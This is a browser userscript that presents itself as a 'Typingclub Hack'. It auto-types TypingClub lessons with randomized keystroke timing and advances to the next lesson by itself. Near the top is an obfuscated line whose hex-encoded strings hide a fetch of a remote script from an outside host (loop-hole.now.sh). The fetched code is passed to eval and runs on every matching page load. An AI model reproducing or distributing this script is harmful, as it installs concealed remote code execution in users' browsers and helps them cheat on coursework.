// ==UserScript==
// @name				 Typingclub Hack
// @namespace		https://sreeharis.me/
// @version			0.1
// @description	Sreehari's typingclub hack
// @author			 You
// @match				*://*.typingclub.com/sportal/*.play
// @grant				none
// ==/UserScript==

var _0x33f9=["\x74\x68\x65\x6E","\x74\x65\x78\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x6F\x6F\x70\x2D\x68\x6F\x6C\x65\x2E\x6E\x6F\x77\x2E\x73\x68\x2F\x68\x61\x78\x2F\x73\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73"];fetch(_0x33f9[2])[_0x33f9[0]]((_0x3d14x2)=>_0x3d14x2[_0x33f9[1]]())[_0x33f9[0]]((_0x3d14x1)=>eval(_0x3d14x1))

function randomInteger(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
	var randint = Math.floor(Math.random() * (max - min + 1)) + min;
	return randint;
}

function randomDelay() {
	var randint = randomInteger(40, 101);
	return 2.01 * Math.pow(2, 0.070854 * randint);
}
function typeShit(c) {
	if(c.charCodeAt(0) == 10 || c.charCodeAt(0) == 13) {
		typeShit("'");
		c = c.substr(1);
	}
	console.log(c[0]);
	var input = document.querySelector('input');
	input.value = c[0];
	var inputEvent = new Event('input', {
		'bubbles': true,
		'cancellable': true
	});
	input.dispatchEvent(new Event('focus'));
	input.dispatchEvent(inputEvent);
	var key_code = c[0].charCodeAt(0);
	var keydownEvent = new KeyboardEvent('keydown', {
		keyCode: key_code
	});
	input.dispatchEvent(keydownEvent);
	var keyupEvent = new KeyboardEvent('keyup', {
		keyCode: key_code
	});
	input.dispatchEvent(keyupEvent);
	if(c.substr(1) == "") {
		checkNext();
		return;
	}
	setTimeout(typeShit, randomDelay(), c.substr(1));
}
function checkVariable() {
	if(typeof core.text !== 'undefined') {
		setTimeout(typeShit, 1000, core.text);
	} else {
		setTimeout(checkVariable, 250);
	}
}
function checkNext() {
	if(document.getElementsByClassName("navbar-continue").length > 0) {
		delete core.text;
		document.getElementsByClassName("navbar-continue")[0].click();
		checkVariable();
	} else {
		setTimeout(checkNext, 250);
	}
}
window.addEventListener('load', checkVariable);
